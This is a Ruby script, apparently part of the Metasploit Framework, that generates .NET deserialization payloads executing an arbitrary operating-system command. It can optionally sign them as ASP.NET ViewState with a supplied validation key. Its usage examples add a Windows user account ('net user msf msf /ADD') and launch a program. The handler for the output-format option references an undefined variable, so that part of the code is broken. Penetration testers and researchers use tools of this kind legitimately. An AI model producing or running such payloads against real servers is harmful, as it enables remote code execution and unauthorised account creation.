#!/usr/bin/env ruby

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

msfbase = __FILE__
while File.symlink?(msfbase)
  msfbase = File.expand_path(File.readlink(msfbase), File.dirname(msfbase))
end
$:.unshift(File.expand_path(File.join(File.dirname(msfbase), '..', '..', '..', 'lib')))
require 'msfenv'
require 'rex'
require 'rex/exploit/view_state'
require 'optparse'

DND = Msf::Util::DotNetDeserialization
BANNER = %Q{
Usage: #{__FILE__} [options]

Generate a .NET deserialization payload that will execute an operating system
command using the specified gadget chain and formatter.

Available formatters:
#{DND::Formatters::NAMES.map { |n| "  * #{n}\n"}.join}
Available gadget chains:
#{DND::GadgetChains::NAMES.map { |n| "  * #{n}\n"}.join}
Available HMAC algorithms: SHA1, HMACSHA256, HMACSHA384, HMACSHA512, MD5

Examples:
  #{__FILE__} -c "net user msf msf /ADD" -f BinaryFormatter -g TypeConfuseDelegate -o base64
  #{__FILE__} -c "calc.exe" -f LosFormatter -g TextFormattingRunProperties \\
    --viewstate-validation-key deadbeef --viewstate-validation-algorithm SHA1
}.strip

def puts_transform_formats
  $stdout.puts 'Available transform formats:'
  $stdout.puts Msf::Simple::Buffer.transform_formats.map { |n| "    * #{n}\n"}.join
end

module YSoSerialDotNet
  class OptsConsole
    def self.parse(args)
      options = {
        formatter:     DND::DEFAULT_FORMATTER,
        gadget_chain:  DND::DEFAULT_GADGET_CHAIN,
        output_format: 'raw',
        viewstate_generator: '',
        viewstate_validation_algorithm: 'SHA1'
      }
      parser = OptionParser.new do |opt|
        opt.banner = BANNER
        opt.separator ''
        opt.separator 'General options:'

        opt.on('-h', '--help', 'Show this message') do
          $stdout.puts opt
          exit
        end

        opt.on('-c', '--command   <String>', 'The command to run') do |v|
          options[:command] = v
        end

        opt.on('-f', '--formatter <String>', "The formatter to use (default: #{DND::DEFAULT_FORMATTER})") do |v|
          v = v.to_sym
          unless DND::Formatters::NAMES.include?(v)
            raise OptionParser::InvalidArgument, "#{v} is not a valid formatter"
          end

          options[:formatter] = v
        end

        opt.on('-g', '--gadget    <String>', "The gadget chain to use (default: #{DND::DEFAULT_GADGET_CHAIN})") do |v|
          v = v.to_sym
          unless DND::GadgetChains::NAMES.include?(v)
            raise OptionParser::InvalidArgument, "#{v} is not a valid gadget chain"
          end

          options[:gadget_chain] = v.to_sym
        end

        opt.on('-o', '--output    <String>', 'The output format to use (default: raw, see: --list-output-formats)') do |v|
          normalized = o.downcase
          unless Msf::Simple::Buffer.transform_formats.include?(normalized)
            raise OptionParser::InvalidArgument, "#{v} is not a valid output format"
          end

          options[:output_format] = v.downcase
        end

        opt.on('--list-output-formats', 'List available output formats, for use with --output') do |v|
          puts_transform_formats
          exit
        end

        opt.separator ''
        opt.separator 'ViewState related options:'

        opt.on('--viewstate-generator             <String>', 'The ViewState generator string to use') do |v|
          unless v =~ /^[a-f0-9]{8}$/i
            raise OptionParser::InvalidArgument, 'must be 8 hex characters, e.g. DEAD1337'
          end

          options[:viewstate_generator] = [v.to_i(16)].pack('V')
        end

        opt.on('--viewstate-validation-algorithm  <String>', 'The validation algorithm (default: SHA1, see: Available HMAC algorithms)') do |v|
          normalized = v.upcase.delete_prefix('HMAC')
          unless %w[SHA1 SHA256 SHA384 SHA512 MD5].include?(normalized)
            raise OptionParser::InvalidArgument, "#{v} is not a valid algorithm"
          end

          # in some instances OpenSSL may not include all the algorithms that we might expect, so check for that
          unless OpenSSL::Digest.constants.include?(normalized.to_sym)
            raise RuntimeError, "OpenSSL does not support the #{normalized} digest"
          end

          options[:viewstate_validation_algorithm] = normalized
        end

        opt.on('--viewstate-validation-key        <HexString>', 'The validationKey from the web.config file') do |v|
          unless v =~ /^[a-f0-9]{2}+$/i
            raise OptionParser::InvalidArgument, 'must be in hex'
          end

          options[:viewstate_validation_key] = v.scan(/../).map { |x| x.hex.chr }.join
        end
      end

      parser.parse!(args)

      if options[:command].blank?
        raise OptionParser::MissingArgument, '-c is required'
      end

      options
    end
  end

  class Driver
    def initialize
      begin
        @opts = OptsConsole.parse(ARGV)
      rescue OptionParser::ParseError => e
        $stderr.puts "[x] #{e.message}"
        exit
      end
    end

    def run
      $stderr.puts "Gadget chain: #{@opts[:gadget_chain]}"
      $stderr.puts "Formatter:    #{@opts[:formatter]}"
      serialized = DND.generate(
        @opts[:command],
        gadget_chain: @opts[:gadget_chain],
        formatter: @opts[:formatter]
      )

      if @opts[:viewstate_validation_key]
        serialized = Rex::Exploit::ViewState.generate_viewstate(
          serialized,
          extra: @opts[:viewstate_generator],
          algo: @opts[:viewstate_validation_algorithm],
          key: @opts[:viewstate_validation_key]
        )
      end

      transformed = ::Msf::Simple::Buffer.transform(serialized, @opts[:output_format])
      $stderr.puts "Size:         #{transformed.length}"
      $stdout.puts transformed
    end
  end
end

if __FILE__ == $PROGRAM_NAME
  driver = YSoSerialDotNet::Driver.new
  begin
    driver.run
  rescue ::Exception => e
    elog(e)
    $stderr.puts "[x] #{e.class}: #{e.message}"
    $stderr.puts "[*] If necessary, please refer to framework.log for more details."
  end
end
